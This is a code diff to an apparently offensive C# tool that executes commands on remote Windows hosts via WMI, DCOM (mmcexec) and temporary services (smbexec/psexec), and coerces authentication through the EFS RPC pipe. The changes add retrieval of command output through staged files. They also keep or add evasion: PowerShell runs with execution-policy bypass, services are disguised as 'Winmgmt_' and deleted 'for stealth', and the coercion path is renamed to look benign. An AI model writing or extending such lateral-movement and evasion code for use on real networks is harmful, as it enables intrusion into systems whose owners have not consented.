@@ -257,6 +257,11 @@ public sealed class SmbCommand : Command
 	[Alias("ps")]
 	public string? PsExecute { get; set; }
 
+	[Parameter]
+	[Alias("no-output")]
+	[Description("Suppress command output retrieval (print PID/status only)")]
+	public SwitchParam NoOutput { get; set; }
+
 	protected override void ValidateParameters(ParameterValidationContext context)
 	{
 		if (this.ListModules.IsSet)
@@ -906,12 +911,19 @@ public sealed class SmbCommand : Command
 				WmiClient wmi = await WmiClient.ConnectTo(workstation, orpId, dcom, cancellationToken).ConfigureAwait(false);
 				var ns = await wmi.OpenNamespace(WmiClient.RootCimV2Namespace, "en-US", cancellationToken).ConfigureAwait(false);
 				var procClass = (WmiClassObject)await ns.GetObjectAsync("Win32_Process", cancellationToken).ConfigureAwait(false);
-				string cmdLine = isPs ? $"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"{cmd?.Replace("\"", "\\\"")}\"" : $"cmd.exe /Q /c \"{cmd}\"";
-				var args = new Dictionary<string, object?> { ["CommandLine"] = cmdLine };
+				string? stage = this.NoOutput.IsSet ? null : ExecOutput.NewStageFile();
+				string cmdLine = isPs ? ExecOutput.WrapPs(cmd!, stage) : ExecOutput.WrapCmd(cmd!, stage);
+				var args = new Dictionary<string, object?> { ["CommandLine"] = cmdLine, ["CurrentDirectory"] = @"C:\" };
 				WmiInstanceObject result = await procClass.InvokeMethodAsync("Create", args, cancellationToken).ConfigureAwait(false);
 				uint ret = Convert.ToUInt32(result["ReturnValue"] ?? 0U);
 				uint pid = Convert.ToUInt32(result["ProcessId"] ?? 0U);
-				if (ret == 0) AtlasConsole.Success($"{host}:{this.Port}", $"wmiexec: PID={pid} – {cmdLine}");
+				if (ret == 0)
+				{
+					if (stage is null)
+						AtlasConsole.Success($"{host}:{this.Port}", $"wmiexec: PID={pid} – {cmdLine}");
+					else if (!await this.PrintStagedOutputAsync(smb, host, stage, $"wmiexec: PID={pid}", cancellationToken).ConfigureAwait(false))
+						AtlasConsole.Success($"{host}:{this.Port}", $"wmiexec: PID={pid} (no output retrieved)");
+				}
 				else AtlasConsole.Fail($"{host}:{this.Port}", $"wmiexec failed ReturnValue={ret}");
 			}
 			else if (method == "smbexec" || method == "psexec")
@@ -923,7 +935,8 @@ public sealed class SmbCommand : Command
 				await rpc.ConnectPipe(scmClient, smb, new UncPath(host, Smb2Client.IpcName, pipe), cancellationToken).ConfigureAwait(false);
 				using var scm = await scmClient.OpenScm(Titanis.Winterop.Security.ScmAccessRights.Connect | Titanis.Winterop.Security.ScmAccessRights.CreateService, cancellationToken).ConfigureAwait(false);
 				string svcName = $"Winmgmt_{Guid.NewGuid():N}".Substring(0, 16);
-				string binPath = isPs ? $"powershell.exe -NoProfile -Command \"{cmd}\"" : $"cmd.exe /Q /c \"{cmd}\"";
+				string? stage = this.NoOutput.IsSet ? null : ExecOutput.NewStageFile();
+				string binPath = isPs ? ExecOutput.WrapPs(cmd!, stage) : ExecOutput.WrapCmdService(cmd!, stage);
 				AtlasConsole.Info($"{host}:{this.Port}", $"{method}: creating service {svcName}");
 				try
 				{
@@ -942,6 +955,8 @@ public sealed class SmbCommand : Command
 					// Cleanup – delete service (stealth)
 					try { await svc.DeleteAsync(cancellationToken).ConfigureAwait(false); AtlasConsole.Info($"{host}:{this.Port}", $"{method}: service {svcName} deleted (stealth)"); }
 					catch { }
+					if (stage is not null)
+						await this.PrintStagedOutputAsync(smb, host, stage, $"{method}: output", cancellationToken).ConfigureAwait(false);
 				}
 				catch (Exception ex)
 				{
@@ -966,6 +981,21 @@ public sealed class SmbCommand : Command
 		{
 			AtlasConsole.Fail($"{host}:{this.Port}", $"exec failed: {ex.Message}");
 		}
+	}
+
+	private async Task<bool> PrintStagedOutputAsync(Smb2Client smb, string host, string stageFile, string prefix, CancellationToken cancellationToken)
+	{
+		string? output = await ExecOutput.ReadAsync(smb, host, stageFile, cancellationToken).ConfigureAwait(false);
+		if (output is null)
+			return false;
+		if (output.Length == 0)
+		{
+			AtlasConsole.Info($"{host}:{this.Port}", $"{prefix}: (no output)");
+			return true;
+		}
+		foreach (var line in output.Split('\n'))
+			AtlasConsole.Info($"{host}:{this.Port}", $"{prefix}: {line.TrimEnd('\r')}");
+		return true;
 	}
 
 	private async Task<DcomClient> ConnectDcomAsync(string host, CancellationToken cancellationToken)
@@ -997,8 +1027,13 @@ public sealed class SmbCommand : Command
 			}
 			string exe = isPs ? "powershell.exe" : "cmd.exe";
 			string args = isPs ? $"-NoProfile -ExecutionPolicy Bypass -Command \"{cmd}\"" : $"/c {cmd}";
+			string? stage = this.NoOutput.IsSet ? null : ExecOutput.NewStageFile();
+			if (stage is not null)
+				args = $"{args} > {ExecOutput.LocalPath(stage)} 2>&1";
 			var result = await obj.InvokeMethod("ExecuteShellCommand", new object[] { exe, "C:\\", args, "7" }, cancellationToken).ConfigureAwait(false);
 			AtlasConsole.Success($"{host}:{this.Port}", $"mmcexec: invoked {exe} {args} -> {(result?.ToString() ?? "<null>")}");
+			if (stage is not null)
+				await this.PrintStagedOutputAsync(smb, host, stage, "mmcexec: output", cancellationToken).ConfigureAwait(false);
 		}
 		catch (Exception ex)
 		{
@@ -1633,7 +1668,7 @@ public sealed class SmbCommand : Command
 
 	private async Task CoerceAsync(Smb2Client smb, string host, string listener, CancellationToken cancellationToken)
 	{
-		string victimPath = listener.StartsWith(@"\\", StringComparison.Ordinal) ? listener : $@"\\{listener}\atlas\x";
+		string victimPath = listener.StartsWith(@"\\", StringComparison.Ordinal) ? listener : $@"\\{listener}\shared\docs";
 		RpcClient rpc = this.Services.CreateRpcClient();
 		EfsClient efs = new EfsClient();
 		await rpc.ConnectPipe(efs, smb, new UncPath(host, Smb2Client.IpcName, EfsClient.EfsPipeName), cancellationToken).ConfigureAwait(false);
